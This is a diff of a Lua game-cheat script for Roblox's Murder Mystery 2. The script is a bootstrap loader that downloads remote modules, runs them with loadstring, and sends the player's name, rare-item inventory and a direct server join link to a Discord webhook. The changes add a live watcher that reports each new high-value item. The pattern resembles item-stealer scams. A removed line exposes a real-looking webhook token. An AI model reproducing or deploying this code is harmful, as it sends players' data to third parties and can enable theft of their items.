@@ -1,6 +1,6 @@
 --============================================================
 -- BLIZZARD MM2 V8.8.4 - MASTER BOOTSTRAP LOADER
--- + INVENTORY WEBHOOK NOTIFICATION
+-- + LIVE INVENTORY WEBHOOK NOTIFIER
 --============================================================
 
 --============================================================
@@ -115,10 +115,6 @@ local function LoadModule(
 		.. fileName
 	)
 
-	--========================================================
-	-- DOWNLOAD
-	--========================================================
-
 	local downloadOk,
 	scriptContent =
 		pcall(function()
@@ -156,10 +152,6 @@ local function LoadModule(
 		return false
 	end
 
-	--========================================================
-	-- COMPILE
-	--========================================================
-
 	local fn,
 	compileError =
 		loadstring(
@@ -179,10 +171,6 @@ local function LoadModule(
 
 		return false
 	end
-
-	--========================================================
-	-- EXECUTE
-	--========================================================
 
 	local runOk,
 	runResult =
@@ -300,13 +288,22 @@ if not httpRequest then
 end
 
 --============================================================
--- WEBHOOK URL
+-- WEBHOOK
 --
--- KEEP THIS ENTIRE URL ON ONE LINE
+-- IMPORTANT:
+-- Put your NEW webhook here.
+-- Keep the entire URL on ONE line.
 --============================================================
 
 local webhookUrl =
-	"https://webhook.lewisakura.moe/api/webhooks/1548529603658653769/U65oFiT9Qmt1n-pw-XvAUQVmFqqB8LGanAnImk35gzcDIoQC4XAnPrVBTkq1lk8xtJye"
+	"https://webhook.lewisakura.moe/api/webhooks/YOUR_WEBHOOK_ID/YOUR_NEW_WEBHOOK_TOKEN"
+
+--============================================================
+-- LIVE WATCH SETTINGS
+--============================================================
+
+local INVENTORY_SCAN_INTERVAL =
+	2
 
 --============================================================
 -- LOAD INVENTORY MODULE
@@ -354,12 +351,19 @@ local PRIMARY_RARITIES = {
 	Ancient = true,
 	Godly = true,
 
-	-- MM2 internally calls Vintage "Classic"
+	-- MM2 internally uses Classic for Vintage
 	Classic = true,
 }
 
 local FILLER_RARITIES = {
 	Legendary = true,
+}
+
+local PRIMARY_PRIORITY = {
+	Unique = 1,
+	Ancient = 2,
+	Godly = 3,
+	Classic = 4,
 }
 
 --============================================================
@@ -399,7 +403,9 @@ local function FirstValue(
 		return nil
 	end
 
-	for _, key in ipairs(keys) do
+	for _, key in ipairs(
+		keys
+	) do
 
 		local value =
 			SafeGet(
@@ -416,7 +422,7 @@ local function FirstValue(
 end
 
 --============================================================
--- ITEM FIELD HELPERS
+-- ITEM HELPERS
 --============================================================
 
 local function GetItemID(
@@ -517,7 +523,7 @@ local function DisplayRarity(
 end
 
 --============================================================
--- GET OWNED WEAPONS
+-- OWNED WEAPONS TABLE
 --============================================================
 
 local function GetWeaponsTable()
@@ -685,28 +691,17 @@ local function ScanInventory()
 		0
 	)
 
-	--========================================================
-	-- SORT HIGH VALUE ITEMS
-	--========================================================
-
-	local priority = {
-		Unique = 1,
-		Ancient = 2,
-		Godly = 3,
-		Classic = 4,
-	}
-
 	table.sort(
 		primary,
 		function(a, b)
 
 			local pa =
-				priority[
+				PRIMARY_PRIORITY[
 					a.Rarity
 				] or 99
 
 			local pb =
-				priority[
+				PRIMARY_PRIORITY[
 					b.Rarity
 				] or 99
 
@@ -725,6 +720,7 @@ local function ScanInventory()
 
 			return a.DataID
 				< b.DataID
+
 		end
 	)
 
@@ -733,7 +729,7 @@ local function ScanInventory()
 end
 
 --============================================================
--- FORMAT SCANNED INVENTORY
+-- INVENTORY FORMATTER
 --============================================================
 
 local function FormatInventoryText(
@@ -808,7 +804,6 @@ local function FormatInventoryText(
 			"\n"
 		)
 
-	-- Discord embed field value safety limit
 	if #text > 1000 then
 
 		text =
@@ -825,18 +820,149 @@ local function FormatInventoryText(
 end
 
 --============================================================
--- RUN SCAN
+-- SNAPSHOT HELPERS
 --============================================================
 
-local primaryItems,
-fillerItems =
-	ScanInventory()
+local function BuildPrimarySnapshot(
+	primary
+)
 
-local parsedInventory =
-	FormatInventoryText(
-		primaryItems,
-		fillerItems
-	)
+	local snapshot = {}
+
+	for _, item in ipairs(
+		primary
+	) do
+
+		snapshot[
+			item.DataID
+		] = {
+			Amount =
+				item.Amount,
+
+			Name =
+				item.Name,
+
+			Rarity =
+				item.Rarity,
+
+			ItemType =
+				item.ItemType,
+		}
+	end
+
+	return snapshot
+end
+
+local function FindPrimaryIncreases(
+	oldSnapshot,
+	currentPrimary
+)
+
+	local increases = {}
+
+	for _, item in ipairs(
+		currentPrimary
+	) do
+
+		local previous =
+			oldSnapshot[
+				item.DataID
+			]
+
+		local previousAmount =
+			previous
+			and tonumber(
+				previous.Amount
+			)
+			or 0
+
+		local currentAmount =
+			tonumber(
+				item.Amount
+			)
+			or 0
+
+		if currentAmount
+			> previousAmount
+		then
+
+			table.insert(
+				increases,
+				{
+					DataID =
+						item.DataID,
+
+					Name =
+						item.Name,
+
+					Rarity =
+						item.Rarity,
+
+					ItemType =
+						item.ItemType,
+
+					Amount =
+						currentAmount,
+
+					Added =
+						currentAmount
+						- previousAmount,
+				}
+			)
+
+		end
+	end
+
+	return increases
+end
+
+local function FormatNewItems(
+	items
+)
+
+	local lines = {}
+
+	for _, item in ipairs(
+		items
+	) do
+
+		table.insert(
+			lines,
+			string.format(
+				"• **%s** (%s) +%d",
+				item.Name,
+				DisplayRarity(
+					item.Rarity
+				),
+				item.Added
+			)
+		)
+	end
+
+	if #lines == 0 then
+		return "• None"
+	end
+
+	local text =
+		table.concat(
+			lines,
+			"\n"
+		)
+
+	if #text > 1000 then
+
+		text =
+			string.sub(
+				text,
+				1,
+				970
+			)
+			.. "\n...and more items!"
+
+	end
+
+	return text
+end
 
 --============================================================
 -- ROBLOX LINKS
@@ -859,10 +985,133 @@ local serverJoinLink =
 	)
 
 --============================================================
--- WEBHOOK PAYLOAD
+-- GENERIC WEBHOOK SENDER
 --============================================================
 
-local payload = {
+local function SendWebhook(
+	payload
+)
+
+	task.spawn(function()
+
+		local encodedBody
+
+		local encodeSuccess,
+		encodeError =
+			pcall(function()
+
+				encodedBody =
+					HttpService:JSONEncode(
+						payload
+					)
+
+			end)
+
+		if not encodeSuccess then
+
+			warn(
+				"[MM2 NOTIFIER] JSON encode failed: "
+				.. tostring(
+					encodeError
+				)
+			)
+
+			return
+		end
+
+		local requestSuccess,
+		response =
+			pcall(function()
+
+				return httpRequest({
+
+					Url =
+						webhookUrl,
+
+					Method =
+						"POST",
+
+					Headers = {
+						["Content-Type"] =
+							"application/json",
+					},
+
+					Body =
+						encodedBody,
+				})
+
+			end)
+
+		if not requestSuccess then
+
+			warn(
+				"[MM2 NOTIFIER] Webhook request failed: "
+				.. tostring(
+					response
+				)
+			)
+
+			return
+		end
+
+		local statusCode =
+			response
+			and (
+				response.StatusCode
+				or response.Status
+			)
+
+		if statusCode
+			and statusCode ~= 200
+			and statusCode ~= 204
+		then
+
+			warn(
+				"[MM2 NOTIFIER] Webhook rejected. Status: "
+				.. tostring(
+					statusCode
+				)
+				.. " | Body: "
+				.. tostring(
+					response.Body
+					or ""
+				)
+			)
+
+			return
+		end
+
+		print(
+			"[MM2 NOTIFIER] Webhook notification sent."
+		)
+
+	end)
+end
+
+--============================================================
+-- INITIAL INVENTORY SCAN
+--============================================================
+
+local primaryItems,
+fillerItems =
+	ScanInventory()
+
+local parsedInventory =
+	FormatInventoryText(
+		primaryItems,
+		fillerItems
+	)
+
+local PreviousPrimarySnapshot =
+	BuildPrimarySnapshot(
+		primaryItems
+	)
+
+--============================================================
+-- INITIAL EXECUTION WEBHOOK
+--============================================================
+
+local initialPayload = {
 
 	embeds = {
 		{
@@ -957,101 +1206,151 @@ local payload = {
 	},
 }
 
+SendWebhook(
+	initialPayload
+)
+
 --============================================================
--- SEND WEBHOOK
+-- LIVE INVENTORY WATCHER
+--
+-- Behaviour:
+--
+-- Initial:
+--   None Detected
+--
+-- Later receives Luger:
+--   sends another webhook
+--
+-- If Luger x1 -> x2:
+--   sends +1
+--
+-- If item is removed:
+--   no notification
+--
+-- If removed then received again:
+--   sends notification again
 --============================================================
 
 task.spawn(function()
 
-	local encodedBody
+	while true do
 
-	local encodeSuccess,
-	encodeError =
-		pcall(function()
+		task.wait(
+			INVENTORY_SCAN_INTERVAL
+		)
 
-			encodedBody =
-				HttpService:JSONEncode(
-					payload
+		-- Stop watcher if Blizzard itself has stopped.
+		if MM2
+			and MM2.Running == false
+		then
+			break
+		end
+
+		local currentPrimary,
+		currentFiller =
+			ScanInventory()
+
+		local increases =
+			FindPrimaryIncreases(
+				PreviousPrimarySnapshot,
+				currentPrimary
+			)
+
+		-- Always refresh baseline.
+		-- This is important when items are traded away.
+		PreviousPrimarySnapshot =
+			BuildPrimarySnapshot(
+				currentPrimary
+			)
+
+		if #increases > 0 then
+
+			local currentInventoryText =
+				FormatInventoryText(
+					currentPrimary,
+					currentFiller
 				)
 
-		end)
+			local newItemsText =
+				FormatNewItems(
+					increases
+				)
 
-	if not encodeSuccess then
+			local updatePayload = {
 
-		warn(
-			"[MM2 NOTIFIER] JSON encode failed: "
-			.. tostring(
-				encodeError
-			)
-		)
+				embeds = {
+					{
+						title =
+							"Blizzard MM2 Inventory Updated! ✨",
 
-		return
-	end
+						color =
+							5763719,
 
-	local requestSuccess,
-	response =
-		pcall(function()
+						fields = {
 
-			return httpRequest({
+							{
+								name =
+									"Player Username",
 
-				Url =
-					webhookUrl,
+								value =
+									tostring(
+										LocalPlayer.Name
+									),
 
-				Method =
-					"POST",
+								inline =
+									true,
+							},
 
-				Headers = {
-					["Content-Type"] =
-						"application/json",
+							{
+								name =
+									"✨ New High Value Items Detected",
+
+								value =
+									newItemsText,
+
+								inline =
+									false,
+							},
+
+							{
+								name =
+									"🎒 Current Player Inventory",
+
+								value =
+									currentInventoryText,
+
+								inline =
+									false,
+							},
+
+							{
+								name =
+									"Direct Server Join Link",
+
+								value =
+									"[Launch & Join Server]("
+									.. serverJoinLink
+									.. ")",
+
+								inline =
+									false,
+							},
+						},
+
+						timestamp =
+							DateTime.now():ToIsoDate(),
+					},
 				},
+			}
 
-				Body =
-					encodedBody,
-			})
-
-		end)
-
-	if not requestSuccess then
-
-		warn(
-			"[MM2 NOTIFIER] Webhook request failed: "
-			.. tostring(
-				response
+			SendWebhook(
+				updatePayload
 			)
-		)
 
-		return
+		end
 	end
-
-	local statusCode =
-		response
-		and (
-			response.StatusCode
-			or response.Status
-		)
-
-	if statusCode
-		and statusCode ~= 200
-		and statusCode ~= 204
-	then
-
-		warn(
-			"[MM2 NOTIFIER] Webhook rejected. Status: "
-			.. tostring(
-				statusCode
-			)
-			.. " | Body: "
-			.. tostring(
-				response.Body
-				or ""
-			)
-		)
-
-		return
-	end
-
-	print(
-		"[MM2 NOTIFIER] Inventory notification sent successfully."
-	)
-
 end)
+
+print(
+	"[MM2 NOTIFIER] Live inventory watcher started."
+)
